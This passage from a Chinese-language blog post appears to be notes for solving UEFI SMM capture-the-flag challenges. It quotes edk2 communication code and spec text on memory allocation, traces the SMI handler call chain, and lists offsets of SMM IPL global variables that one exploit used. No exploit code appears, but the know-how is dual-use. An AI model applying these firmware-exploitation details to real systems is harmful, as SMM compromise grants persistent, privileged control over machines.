class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">**/</span><br><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCommunicationCommunicate</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span><br><span class="line"><span class="params">  IN OUT VOID                              *CommBuffer,</span></span><br><span class="line"><span class="params">  IN OUT UINTN                             *CommSize OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS                  Status;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER  *CommunicateHeader;</span><br><span class="line">  BOOLEAN                     OldInSmm;</span><br><span class="line">  UINTN                       TempCommSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check parameters</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (CommBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommBuffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CommSize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    TempCommSize = OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data) + CommunicateHeader-&gt;MessageLength;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    TempCommSize = *CommSize;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// CommSize must hold HeaderGuid and MessageLength</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (TempCommSize &lt; OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// If not already in SMM, then generate a Software SMI</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (!gSmmCorePrivate-&gt;InSmm &amp;&amp; gSmmCorePrivate-&gt;SmmEntryPointRegistered) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Put arguments for Software SMI in gSmmCorePrivate</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    gSmmCorePrivate-&gt;CommunicationBuffer = CommBuffer;</span><br><span class="line">    gSmmCorePrivate-&gt;BufferSize          = TempCommSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Generate Software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Status = mSmmControl2-&gt;Trigger (mSmmControl2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (EFI_ERROR (Status)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Return status from software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (CommSize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      *CommSize = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gSmmCorePrivate-&gt;ReturnStatus;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>第一个参数是指向这个<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>的指针</p>
</li>
<li><p>第二个参数一般是一个<code>EFI_SMM_COMMUNICATE_HEADER</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID             HeaderGuid;</span><br><span class="line">  UINTN                MessageLength;</span><br><span class="line">  UINT8                Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125;   EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>HeaderGuid</code></p>
<p>Allows for disambiguation of the message format. Type <em>EFI_GUID</em> is defined in <em>InstallProtocolInterface()</em> .</p>
</li>
<li><p><code>MessageLength</code></p>
<p>Describes the size of <em>Data</em> (in bytes) and does not include the size of the header.</p>
</li>
<li><p><code>Data</code></p>
<p>Designates an array of bytes that is <em>MessageLength</em> in size</p>
</li>
</ul>
</li>
<li><p>第三个参数是size,一般不需要特意指定为NULL即可</p>
</li>
</ul>
<p>该函数将消息复制到全局变量中<strong>并触发软件 SMI 来处理它</strong>。<u>该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</u></p>
<hr>
<p>所以,一般这类题目都需要着重分析题目SMM程序注册的handler</p>
<h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>bootservices中有这两个指针<strong>AllocatePages</strong>与<strong>AllocatePool</strong>都可以用于分配内存</p>
<blockquote>
<p>AllocatePages</p>
<p>Allocates pages of a particular type.</p>
</blockquote>
<p><strong>Summary</strong></p>
<p>Allocates memory pages from the system.</p>
<p><strong>Prototype</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_ALLOCATE_PAGES) (</span><br><span class="line">   IN EFI_ALLOCATE_TYPE                   Type,</span><br><span class="line">   IN EFI_MEMORY_TYPE                     MemoryType,</span><br><span class="line">   IN UINTN                               Pages,</span><br><span class="line">   IN OUT EFI_PHYSICAL_ADDRESS            *Memory</span><br><span class="line">   );</span><br></pre></td></tr></table></figure>
<p><strong>Parameters</strong></p>
<ul>
<li><p>Type</p>
<p>The type of allocation to perform. See “Related Definitions.”</p>
</li>
<li><p>MemoryType</p>
<p>The type of memory to allocate. The type EFI_MEMORY_TYPE is defined in “Related Definitions” below. These memory types are also described in more detail in <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-before-exitbootservices">Memory Type Usage before ExitBootServices()</a>, and <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-after-exitbootservices">Memory Type Usage after ExitBootServices()</a> . Normal allocations (that is, allocations by any UEFI application) are of type EfiLoaderData. <em>MemoryType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>MemoryType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p>
</li>
<li><p>Pages</p>
<p>The number of contiguous 4 KiB pages to allocate.</p>
</li>
<li><p>Memory</p>
<p>Pointer to a physical address. On input, the way in which the address is used depends on the value of <em>Type</em>. See “Description” for more information. On output the address is set to the base of the page range that was allocated. See “Related Definitions.”</p>
</li>
</ul>
<p><strong>NOTE</strong>: UEFI Applications, UEFI Drivers, and UEFI OS Loaders <em>must not allocate memory of types</em> EfiReservedMemoryType, EfiMemoryMappedIO, <em>and</em> EfiUnacceptedMemoryType.</p>
<p><strong>Related Definitions</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_ALLOCATE_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These types are discussed in the &quot;Description&quot; section below.</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   AllocateAnyPages,</span><br><span class="line">   AllocateMaxAddress,</span><br><span class="line">   AllocateAddress,</span><br><span class="line">   MaxAllocateType</span><br><span class="line">&#125; EFI_ALLOCATE_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_MEMORY_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These type values are discussed in Memory Type Usage before ExitBootServices()  and  Memory Type Usage after ExitBootServices().</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   EfiReservedMemoryType,</span><br><span class="line">   EfiLoaderCode,</span><br><span class="line">   EfiLoaderData,</span><br><span class="line">   EfiBootServicesCode,</span><br><span class="line">   EfiBootServicesData,</span><br><span class="line">   EfiRuntimeServicesCode,</span><br><span class="line">   EfiRuntimeServicesData,</span><br><span class="line">   EfiConventionalMemory,</span><br><span class="line">   EfiUnusableMemory,</span><br><span class="line">   EfiACPIReclaimMemory,</span><br><span class="line">   EfiACPIMemoryNVS,</span><br><span class="line">   EfiMemoryMappedIO,</span><br><span class="line">   EfiMemoryMappedIOPortSpace,</span><br><span class="line">   EfiPalCode,</span><br><span class="line">   EfiPersistentMemory,</span><br><span class="line">   EfiUnacceptedMemoryType,</span><br><span class="line">   EfiMaxMemoryType</span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_PHYSICAL_ADDRESS</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="keyword">typedef</span> UINT64 EFI_PHYSICAL_ADDRESS;</span><br></pre></td></tr></table></figure>
<p><strong>Description</strong></p>
<p>The AllocatePages() function allocates the requested number of pages and returns a pointer to the base address of the page range in the location referenced by <em>Memory</em>. The function scans the memory map to locate free pages. When it finds a physically contiguous block of pages that is large enough and also satisfies the allocation requirements of <em>Type</em>, it changes the memory map to indicate that the pages are now of type <em>MemoryType</em>.</p>
<p>In general, UEFI OS loaders and UEFI applications should allocate memory (and pool) of type EfiLoaderData. UEFI boot service drivers must allocate memory (and pool) of type EfiBootServicesData. UREFI runtime drivers should allocate memory (and pool) of type EfiRuntimeServicesData (although such allocation can only be made during boot services time).</p>
<p>Allocation requests of <em>Type</em> AllocateAnyPages allocate any available range of pages that satisfies the request. On input, the address pointed to by <em>Memory</em> is ignored.</p>
<p>Allocation requests of <em>Type</em> <em>AllocateMaxAddress</em> allocate any available range of pages whose uppermost address is less than or equal to the address pointed to by <em>Memory</em> on input.</p>
<p>Allocation requests of <em>Type</em> AllocateAddress allocate pages at the address pointed to by <em>Memory</em> on input.</p>
<p><strong>NOTE</strong>: <em>UEFI drivers and UEFI applications that are not targeted for a specific implementation must perform memory allocations for the following runtime types using AllocateAnyPages address mode:</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EfiACPIReclaimMemory,</span><br><span class="line">EfiACPIMemoryNVS,</span><br><span class="line">EfiRuntimeServicesCode,</span><br><span class="line">EfiRuntimeServicesData,</span><br><span class="line">EfiReservedMemoryType.</span><br></pre></td></tr></table></figure>
<p><strong>Status Codes Returned</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>EFI_SUCCESS</th>
<th>The requested pages were allocated.</th>
</tr>
</thead>
<tbody>
<tr>
<td>EFI_OUT_OF_RESOURCEST</td>
<td>The pages could not be allocated.</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>Type</em> is not AllocateAnyPages or AllocateMaxAddress or AllocateAddress</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>MemoryType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>MemoryType</em> is EfiPersistentMemoryType or EfiUnacceptedMemory.</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>Memory</em> is NULL.</td>
</tr>
<tr>
<td>EFI_NOT_FOUND</td>
<td>The requested pages could not be found.</td>
</tr>
</tbody>
</table>
</div>
<hr>
<blockquote>
<p>AllocatePool</p>
<p>Allocates a pool of a particular type.</p>
</blockquote>
<p><strong>Summary</strong></p>
<p>Allocates pool memory.</p>
<p><strong>Prototype</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI  *EFI_ALLOCATE_POOL) (</span><br><span class="line">   IN EFI_MEMORY_TYPE            PoolType,</span><br><span class="line">   IN UINTN                      Size,</span><br><span class="line">   OUT VOID                      **Buffer</span><br><span class="line">   );</span><br></pre></td></tr></table></figure>
<p><strong>Parameters</strong></p>
<ul>
<li><p>PoolType</p>
<p>The type of pool to allocate. Type EFI_MEMORY_TYPE is defined in the <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-allocatepages">EFI_BOOT_SERVICES.AllocatePages()</a> function description. <em>PoolType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>PoolType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p>
</li>
<li><p>Size</p>
<p>The number of bytes to allocate from the pool.</p>
</li>
<li><p>Buffer</p>
<p>A pointer to a pointer to the allocated buffer if the call succeeds; undefined otherwise.</p>
</li>
</ul>
<p><strong>Note:</strong> <em>UEFI applications and UEFI drivers must not allocate memory of type</em> EfiReservedMemoryType.</p>
<p><strong>Description</strong></p>
<p>The AllocatePool() function allocates a memory region of Size bytes from memory of type <em>PoolType</em> and returns the address of the allocated memory in the location referenced by <em>Buffer</em>. This function allocates pages from EfiConventionalMemory as needed to grow the requested pool type. All allocations are eight-byte aligned.</p>
<p>The allocated pool memory is returned to the available pool with the <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#id17">EFI_BOOT_SERVICES.FreePool()</a> function.</p>
<p><strong>Status Codes Returned</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>EFI_SUCCESS</th>
<th>The requested number of bytes was allocated.</th>
</tr>
</thead>
<tbody>
<tr>
<td>EFI_OUT_OF_RESOURCES</td>
<td>The pool requested could not be allocated.</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>PoolType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>PoolType</em> is EfiPersistentMemory.</td>
</tr>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>Buffer</em> is NULL.</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p>The agent invoking the communication interface at runtime may be virtually mapped. The MM infrastructure code and handlers, on the other hand, execute in physical mode.As a result, the non- MM agent, which may be executing in the virtual-mode OS context as a result of an OS invocation of the UEFI SetVirtualAddressMap() service, should use a contiguous memory buffer with a physical address before invoking this service. If the virtual address of the buffer is used, the MM Driver may not know how to do the appropriate virtual-to-physical conversion.<br>在<a target="_blank" rel="noopener" href="https://edk2.groups.io/g/devel/topic/30910271">这里</a>讨论了这个问题，指出<code>EfiReservedMemoryType</code>, <code>EfiACPIMemoryNVS</code>或<code>EfiRuntimeServicesData</code>可以满足条件，<strong>最后发现<code>EfiRuntimeServicesData</code>类型的内存可以让<code>SmmCommunication-&gt;Communicate</code>返回<code>EFI_SUCCESS</code></strong>，推测完成了与SMM的态通信，也可以结合<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/3840c35e34d1c992268092b6366e26f2acc55a75/UefiCpuPkg/PiSmmCommunication/PiSmmCommunicationPei.c#L275">源码</a>来具体分析。</p>
<h2 id="debugon"><a href="#debugon" class="headerlink" title="debugon"></a>debugon</h2><p>在qemu启动脚本中加入这一句</p>
<p><code>-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</code></p>
<p>之后<code>cat debug.log</code>即可获得许多调试信息</p>
<h2 id="SMRAM"><a href="#SMRAM" class="headerlink" title="SMRAM"></a>SMRAM</h2><p>SMM状态下有类似SMAP和SMEP这样的保护</p>
<p>其只能访问位于SMRAM的内存</p>
<p>否则会有检测<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/master/MdePkg/Library/SmmMemLib/SmmMemLib.c">edk2/MdePkg/Library/SmmMemLib/SmmMemLib.c at master · tianocore/edk2 (github.com)</a></p>
<h2 id="SMI流程"><a href="#SMI流程" class="headerlink" title="SMI流程"></a>SMI流程</h2><p>我们一般直接交互处于DXE状态</p>
<p>通过SMI进入SMM后：</p>
<ul>
<li>会将当前状态存在SMBASE + 0x8000 + 0x7c00，比如各个寄存器的值</li>
<li>执行SMBASE + 0x8000处的代码</li>
</ul>
<p>SMBASE + 0x8000会被初始化为gcSmiHandlerTemplate</p>
<p>函数调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcSmiHandlerTemplate</span><br><span class="line">-&gt; SmiRendezvous</span><br><span class="line">-&gt; BSPHandler</span><br><span class="line">-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry</span><br><span class="line">   SmmEntryPoint</span><br><span class="line">-&gt; SmiManage (IMAGE, GUID, CommBuffer)</span><br></pre></td></tr></table></figure>
<p>SmiManage中最后会执行之前注册的Handler，ToySMM中是ToyMain</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                   (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                   Context,</span><br><span class="line">                                   CommBuffer,</span><br><span class="line">                                   CommBufferSize</span><br><span class="line">                                   );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><p>SmmEntryPoint将gSmmCorePrivate-&gt;CommunicationBuffer的数据传递给了SmiManage，<strong>gSmmCorePrivate是个全局变量</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">  </span><br><span class="line">   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;</span><br><span class="line">   BufferSize          = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">  </span><br><span class="line">……</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;</span><br><span class="line">       <span class="comment">// BufferSize was updated by the SafeUintnSub() call above.</span></span><br><span class="line">       Status = SmiManage (</span><br><span class="line">                  &amp;CommunicateHeader-&gt;HeaderGuid,</span><br><span class="line">                  <span class="literal">NULL</span>,</span><br><span class="line">                  CommunicateHeader-&gt;Data,</span><br><span class="line">                  &amp;BufferSize</span><br><span class="line">                  );</span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure>
</li>
<li><p>SmiManage调用SmmCoreFindSmiEntry通过HandlerType（GUID）查找之前注册的SmiHandler，调用Handler</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiManage</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN     CONST EFI_GUID  *HandlerType,</span></span><br><span class="line"><span class="params">  IN     CONST VOID      *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Non-root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">    Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                       (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                       Context,</span><br><span class="line">                                       CommBuffer,</span><br><span class="line">                                       CommBufferSize</span><br><span class="line">                                       );</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>gSmmCorePrivate全局变量定义在PiSmmIpl模块，被初始化为mSmmCorePrivateData</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br></pre></td></tr></table></figure>
<h2 id="全局comm变量"><a href="#全局comm变量" class="headerlink" title="全局comm变量"></a>全局comm变量</h2><p>在ToySMM那题的第二种exp写法中,这位师傅并不分配新的结构体然后再去调用<code>communicate()</code>,而是直接布置在全局变量中并触发(见上一小节),尽管完全可以用写法1替代,但我仍然疑惑那些变量是如何找到的</p>
<p>最终我在源代码中找到了这些</p>
<p>在<code>/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Communication Protocol instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// PI 1.7 MM Communication Protocol 2 instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_MM_COMMUNICATION2_PROTOCOL  mMmCommunication2 = &#123;</span><br><span class="line">  SmmCommunicationMmCommunicate2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Core Private Data structure that contains the data shared between</span></span><br><span class="line"><span class="comment">// the SMM IPL and the SMM Core.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  mSmmCorePrivateData = &#123;</span><br><span class="line">  SMM_CORE_PRIVATE_DATA_SIGNATURE,    <span class="comment">// Signature</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmIplImageHandle</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// SmramRangeCount</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmramRanges</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmEntryPoint</span></span><br><span class="line">  FALSE,                              <span class="comment">// SmmEntryPointRegistered</span></span><br><span class="line">  FALSE,                              <span class="comment">// InSmm</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// Smst</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// CommunicationBuffer</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// BufferSize</span></span><br><span class="line">  EFI_SUCCESS                         <span class="comment">// ReturnStatus</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Global pointer used to access mSmmCorePrivateData from outside and inside SMM</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM IPL global variables</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_CONTROL2_PROTOCOL  *mSmmControl2;</span><br><span class="line">EFI_SMM_ACCESS2_PROTOCOL   *mSmmAccess;</span><br><span class="line">EFI_SMRAM_DESCRIPTOR       *mCurrentSmramRange;</span><br><span class="line">BOOLEAN                    mSmmLocked = FALSE;</span><br><span class="line">BOOLEAN                    mEndOfDxe  = FALSE;</span><br><span class="line">EFI_PHYSICAL_ADDRESS       mSmramCacheBase;</span><br><span class="line">UINT64                     mSmramCacheSize;</span><br><span class="line"></span><br><span class="line">EFI_SMM_COMMUNICATE_HEADER                  mCommunicateHeader;</span><br><span class="line">EFI_LOAD_FIXED_ADDRESS_CONFIGURATION_TABLE  *mLMFAConfigurationTable = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>但又令我困惑的是在实际内存中,这些变量似乎并没有按照源码中的间隔排布(顺序是对的,但中间插入了许多其他变量)</p>
<p>不过我们也能够确定偏移,以<code>mSmmCommunication</code>偏移为0</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>name</th>
<th>offset</th>
</tr>
</thead>
<tbody>
<tr>
<td>mSmmCommunication</td>
<td>0</td>
</tr>
<tr>
<td>mSmmCorePrivateData</td>
<td>0x70</td>
</tr>
<tr>
<td>mSmmCorePrivateData.CommunicationBuffer</td>
<td>0xa8</td>
</tr>
<tr>
<td>mSmmCorePrivateData.BufferSize</td>
<td>0xb0</td>
</tr>
<tr>
<td>mCommunicateHeader.HeaderGuid</td>
<td>0xf0</td>
</tr>
<tr>
